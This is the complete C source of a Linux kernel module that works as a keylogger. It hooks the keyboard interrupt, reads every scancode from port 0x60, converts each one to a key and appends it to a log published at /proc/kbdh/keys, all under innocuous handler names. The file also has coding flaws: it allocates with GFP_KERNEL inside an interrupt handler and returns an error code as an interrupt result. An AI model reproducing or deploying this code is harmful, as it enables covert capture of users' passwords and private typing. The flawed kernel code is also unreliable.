#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>

#include "src/keyp.h"
#include "src/fs.h"

#define IRQ_N	1

static int DEBUG = 1;
module_param(DEBUG, int, 0);
MODULE_PARM_DESC(DEBUG, "1 to enable debugging, default 0");

static DEFINE_SPINLOCK(kbdlock);

static struct proc_dir_entry *parent;

irqreturn_t irq_kbdh_handler(int irq, void *dev_id)
{
	unsigned int scancode; // Hardware generated scan-code
	char *key;
	
	/* Wait is not possible for us, since this function is called many times */
	key = (char *)kmalloc(MAX_SIZE, GFP_KERNEL | GFP_NOWAIT);
	if (key == NULL)
		return -EFAULT;

	spin_lock(&kbdlock);

	scancode = inb(0x60); // byte-width port input

	if (kbd_char(scancode, key) < 0)
		goto err;
	if (key[0] == '\0') // Sometimes an empty string might be printed
		goto err;

	append_to_keys(key);

	spin_unlock(&kbdlock);

	kfree(key);

	/* Debugging messages in this function will spam the kernel ring buffer
	 * too much so I'd rather not to. */

	return IRQ_HANDLED;

err:
	if (spin_is_locked(&kbdlock))
		spin_unlock(&kbdlock);
	kfree(key);
	return IRQ_NONE;
}

static int __init sys_handler_kbd_init(void)
{
	int ret = 0;

	parent = proc_mkdir("kbdh", NULL);
	proc_create("keys", 0, parent, &proc_fops_keys);

	ret = request_irq(IRQ_N, irq_kbdh_handler, IRQF_SHARED, "irq_keyboard", (void *)irq_kbdh_handler);
	if (ret < 0)
		return ret;

	if (DEBUG)
		printk(KERN_INFO "%s: Successfully created an IRQ handler and /proc entry\n", THIS_MODULE->name);

	return ret;
}

static void __exit sys_handler_kbd_exit(void)
{
	proc_remove(parent);
	free_irq(IRQ_N, (void *)irq_kbdh_handler);
}

MODULE_LICENSE("GPL");

module_init(sys_handler_kbd_init);
module_exit(sys_handler_kbd_exit);
